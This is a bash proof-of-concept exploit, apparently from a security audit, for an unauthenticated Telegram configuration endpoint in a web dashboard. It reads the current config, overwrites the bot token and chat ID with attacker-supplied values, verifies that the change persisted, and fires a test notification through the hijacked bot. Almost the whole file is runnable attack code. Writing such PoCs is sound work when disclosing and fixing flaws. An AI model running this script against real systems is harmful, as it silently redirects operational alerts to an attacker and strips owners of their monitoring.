#!/usr/bin/env bash
# PoC: H4 — Telegram Config Overwrite
# CVE-class: CWE-306 — Missing Authentication for Critical Function
# Affected: dashboard/routes/system.py:152-157
#
# POST /api/telegram/config allows any unauthenticated client to replace
# the Telegram bot token and chat ID with attacker-controlled values.
# All subsequent system notifications are then routed to the attacker.
# The change is persisted to telegram_config.json and survives restarts.

TARGET="${1:-http://localhost:9000}"
ATTACKER_TOKEN="${2:-ATTACKER_BOT_TOKEN_HERE}"
ATTACKER_CHAT="${3:-ATTACKER_CHAT_ID_HERE}"

echo "[*] H4 Telegram Config Overwrite PoC"
echo "[*] Target: $TARGET"
echo ""

# --- Step 1: read current config (no auth — chained with H3) ---
echo "[1] Reading current Telegram config (unauthenticated):"
ORIG=$(curl -s "$TARGET/api/telegram/config")
echo "    Current config: $ORIG"

# --- Step 2: overwrite with attacker-controlled values ---
echo ""
echo "[2] Overwriting config with attacker bot token (unauthenticated POST):"
WRITE_RESP=$(curl -s -X POST "$TARGET/api/telegram/config" \
  -H "Content-Type: application/json" \
  -d "{\"bot_token\":\"$ATTACKER_TOKEN\",\"chat_id\":\"$ATTACKER_CHAT\"}" \
  -w "\n__HTTP_%{http_code}__")

CODE=$(echo "$WRITE_RESP" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
BODY=$(echo "$WRITE_RESP" | sed 's/__HTTP_[0-9]*__//')
echo "    HTTP $CODE"
echo "    Response: $BODY"

if [ "$CODE" = "200" ]; then
    echo "    [PASS] Config overwritten without authentication"
elif [ "$CODE" = "500" ]; then
    echo "    [PARTIAL] HTTP 500 (telegram module error — token validation) — NOT 401"
    echo "    [CONFIRMED] No auth enforced on write endpoint"
fi

# --- Step 3: verify the overwrite persisted ---
echo ""
echo "[3] Verifying overwrite persisted (read-back):"
NEW_CFG=$(curl -s "$TARGET/api/telegram/config")
echo "    Config after write: $NEW_CFG"
if echo "$NEW_CFG" | grep -q "$ATTACKER_TOKEN"; then
    echo "    [IMPACT] Attacker token is now active — all notifications redirected"
fi

# --- Step 4: send a test notification through the now-hijacked bot ---
echo ""
echo "[4] Triggering test notification via hijacked bot config:"
TEST_RESP=$(curl -s -X POST "$TARGET/api/telegram/test" \
  -w "\n__HTTP_%{http_code}__")
CODE2=$(echo "$TEST_RESP" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
echo "    /api/telegram/test HTTP $CODE2 (also unauthenticated)"
echo "    If 200: test message was delivered to attacker's Telegram chat"
echo "    If 500: bot token was rejected by Telegram API (expected with placeholder)"

echo ""
echo "[*] PoC complete."
echo "[*] Security effect: all system notifications permanently re-routed to attacker."
echo "[*] Legitimate owner loses monitoring; attacker receives real-time operational intel."
